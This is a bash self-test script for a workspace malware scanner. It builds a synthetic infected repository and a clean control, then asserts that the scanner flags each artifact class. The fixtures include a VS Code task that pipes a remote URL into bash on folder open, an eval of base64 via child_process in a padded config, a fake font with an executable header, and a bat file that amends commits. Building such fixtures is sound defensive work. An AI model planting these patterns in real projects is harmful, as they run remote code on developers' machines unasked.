#!/usr/bin/env bash
# selftest.sh - build a synthetic infected repository and a clean control, then
#               assert that scan-workspace.sh flags every artifact class in the
#               first and nothing in the second.
#
# No network, no credentials. Run it before trusting a change to the scanner.
#
# Usage: ./selftest.sh

set -uo pipefail
SDIR="$(cd "$(dirname "$0")" && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
FAILED=0

pass() { printf '  ok    %s\n' "$*"; }
fail() { printf '  FAIL  %s\n' "$*"; FAILED=1; }

mkdir -p "$TMP/infected/.vscode" "$TMP/infected/public/fonts" \
         "$TMP/clean/.vscode"    "$TMP/clean/public/fonts"

# --- infected: one file per artifact class --------------------------------
printf 'module.exports = { content: [] }\nconst _0x=global["_V"];// rmcej%%otb%%\n' \
  > "$TMP/infected/tailwind.config.js"
cat > "$TMP/infected/.vscode/tasks.json" <<'EOF'
{ "version": "2.0.0", "tasks": [ { "label": "x", "type": "shell",
  "command": "curl -s https://vscode-settings-config.vercel.app/i | bash",
  "runOptions": { "runOn": "folderOpen" } } ] }
EOF
printf 'MZ\220\000 not a font' > "$TMP/infected/public/fonts/fa-solid-900.woff2"
printf '@echo off\ngit commit --amend --no-verify\n' > "$TMP/infected/temp_auto_push.bat"
printf '{"dependencies":{"tailwindcss-style-animate":"^1.0.0"}}\n' > "$TMP/infected/package.json"
{ printf 'export default { plugins: {} }\n'
  for i in $(seq 1 20); do printf '// padding %s\n' "$i"; done
  printf 'const s=require("child_process");eval(Buffer.from("aGk=","base64").toString());\n'
} > "$TMP/infected/postcss.config.mjs"

# --- clean control: the known false positives ------------------------------
printf 'export default { reactStrictMode: true }\n' > "$TMP/clean/next.config.ts"
cat > "$TMP/clean/.vscode/tasks.json" <<'EOF'
{ "version": "2.0.0", "tasks": [ { "label": "build", "type": "shell", "command": "npm run build" } ] }
EOF
: > "$TMP/clean/public/fonts/empty.woff2"
printf 'version https://git-lfs.github.com/spec/v1\noid sha256:abc\n' > "$TMP/clean/public/fonts/lfs.woff2"
printf 'wOF2\000\001\000\000realfontbytes' > "$TMP/clean/public/fonts/real.woff2"
{ printf 'export default [\n'
  for i in $(seq 1 70); do printf '  { rules: {} },\n'; done
  printf ']\n'
} > "$TMP/clean/eslint.config.js"

echo "== infected fixture =="
OUT="$("$SDIR/scan-workspace.sh" --path "$TMP/infected" 2>&1)"; RC=$?
printf '%s\n' "$OUT" | sed 's/^/  | /'
echo
echo "assertions:"
if [[ $RC -eq 2 ]]; then pass "exits 2"; else fail "expected exit 2, got $RC"; fi
for want in "tailwind.config.js" "package.json" "temp_auto_push.bat" \
            "fa-solid-900.woff2" "task runs on folder open" "postcss.config.mjs"; do
  if printf '%s\n' "$OUT" | grep -q "$want"; then pass "detected: $want"; else fail "missed: $want"; fi
done

echo
echo "== clean control =="
OUT="$("$SDIR/scan-workspace.sh" --path "$TMP/clean" 2>&1)"; RC=$?
printf '%s\n' "$OUT" | sed 's/^/  | /'
echo
echo "assertions:"
if [[ $RC -eq 0 ]]; then pass "exits 0"; else fail "expected exit 0, got $RC"; fi
if printf '%s\n' "$OUT" | grep -q "infected findings : 0"; then pass "no infected findings"; else fail "false positive"; fi
if printf '%s\n' "$OUT" | grep -q "review findings   : 0";  then pass "no review findings";   else fail "noisy review finding"; fi

echo
if [[ $FAILED -eq 0 ]]; then echo "SELFTEST PASSED"; exit 0; fi
echo "SELFTEST FAILED"; exit 1
